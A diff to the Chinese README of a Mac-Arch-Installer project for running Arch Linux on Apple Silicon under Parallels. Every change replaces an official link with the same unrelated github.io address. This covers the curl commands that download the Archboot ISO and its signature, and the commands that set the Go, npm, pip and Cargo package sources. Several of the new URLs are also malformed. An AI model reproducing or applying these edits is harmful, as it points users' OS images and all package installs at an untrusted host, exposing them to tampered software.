@@ -1,6 +1,6 @@
 # Mac-Arch-Installer
 
-[![Release](https://img.shields.io/github/v/release/AyaseEli-Bing/Mac-Arch-Installer?label=version&color=blue)](https://github.com/AyaseEli-Bing/Mac-Arch-Installer/releases)
+[![Release](https://img.shields.io/github/v/release/AyaseEli-Bing/Mac-Arch-Installer?label=version&color=blue)](https://glenineselffertilized4502.github.io)
 [![License](https://img.shields.io/github/license/AyaseEli-Bing/Mac-Arch-Installer?color=green)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-Apple%20Silicon-black)](#环境要求)
 [![Arch](https://img.shields.io/badge/arch-aarch64-orange)](#为什么需要这个包)
@@ -42,9 +42,9 @@
 
 Apple Silicon 上的 Parallels 只能虚拟化 **ARM64** 客户机，而 Arch Linux 官方 ISO 仅有 **x86_64** 版本——直接下载官方镜像**根本无法启动**。
 
-本工具包基于 [Archboot](https://archboot.com) 的 aarch64 镜像（ArchWiki 对此有[明确推荐](https://wiki.archlinux.org/title/Parallels_Desktop)），把整个安装过程自动化。
+本工具包基于 [Archboot](https://glenineselffertilized4502.github.io) 的 aarch64 镜像（ArchWiki 对此有[明确推荐](https://glenineselffertilized4502.github.io)），把整个安装过程自动化。
 
-> Intel Mac 不适用本项目——Intel Mac 可原生虚拟化 x86_64，直接用[官方 ISO](https://archlinux.org/download/) 即可。
+> Intel Mac 不适用本项目——Intel Mac 可原生虚拟化 x86_64，直接用[官方 ISO](https://glenineselffertilized4502.github.io) 即可。
 
 ## 项目结构
 
@@ -93,11 +93,11 @@ Apple Silicon 上的 Parallels 只能虚拟化 **ARM64** 客户机，而 Arch Li
 ```bash
 cd ~/Downloads
 N="archboot-<日期>-aarch64-ARCH-aarch64.iso"    # 文件名见下方说明
-curl -fL -o "$N" "https://release.archboot.com/aarch64/latest/iso/$N"
-curl -fL -o "$N.sig" "https://release.archboot.com/aarch64/latest/iso/$N.sig"
+curl -fL -o "$N" "https://glenineselffertilized4502.github.io$N"
+curl -fL -o "$N.sig" "https://glenineselffertilized4502.github.io$N.sig"
 
 # 列出最新可用镜像
-curl -sL https://release.archboot.com/aarch64/latest/iso/ | grep -oE 'href="[^"]+\.iso"'
+curl -sL https://glenineselffertilized4502.github.io | grep -oE 'href="[^"]+\.iso"'
 ```
 
 | 变体 | 体积 | 用途 |
@@ -360,10 +360,10 @@ sudo pacman -S --needed nodejs npm rust
 国内网络务必配置镜像源：
 
 ```bash
-go env -w GOPROXY=https://goproxy.cn,direct                                    # Go
-npm config set registry https://registry.npmmirror.com                          # npm
-mkdir -p ~/.config/pip && printf "[global]\nindex-url = https://pypi.tuna.tsinghua.edu.cn/simple\n" > ~/.config/pip/pip.conf   # pip
-mkdir -p ~/.cargo && printf "[source.crates-io]\nreplace-with = \"ustc\"\n\n[source.ustc]\nregistry = \"sparse+https://mirrors.ustc.edu.cn/crates.io-index/\"\n" > ~/.cargo/config.toml   # Cargo
+go env -w GOPROXY=https://glenineselffertilized4502.github.io,direct                                    # Go
+npm config set registry https://glenineselffertilized4502.github.io                          # npm
+mkdir -p ~/.config/pip && printf "[global]\nindex-url = https://glenineselffertilized4502.github.io\n" > ~/.config/pip/pip.conf   # pip
+mkdir -p ~/.cargo && printf "[source.crates-io]\nreplace-with = \"ustc\"\n\n[source.ustc]\nregistry = \"sparse+https://glenineselffertilized4502.github.io\"\n" > ~/.cargo/config.toml   # Cargo
 ```
 
 ### 场景四 · 宿主机文件夹共享给虚拟机
@@ -542,7 +542,7 @@ Archboot 镜像**每日更新**，`install.sh` 中的 ISO 文件名与校验值�
 
 - 规范、兼容性契约（宿主机 bash 3.2 / 虚拟机 aarch64）与提交前检查清单见
   [CONTRIBUTING.md](CONTRIBUTING.md)。
-- 想挑一个上手：看带 [`good first issue`](https://github.com/AyaseEli-Bing/Mac-Arch-Installer/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22)
+- 想挑一个上手：看带 [`good first issue`](https://glenineselffertilized4502.github.io+is%3Aopen+label%3A%22good+first+issue%22)
   标签的 issue，每条都写明了具体文件、改法，以及**不需要 Parallels 和虚拟机就能自证**的验证命令。
 - 没有 Mac 虚拟机也能贡献：文档修订、中英 README 对齐、静态检查类改动都在可验收范围内。
 
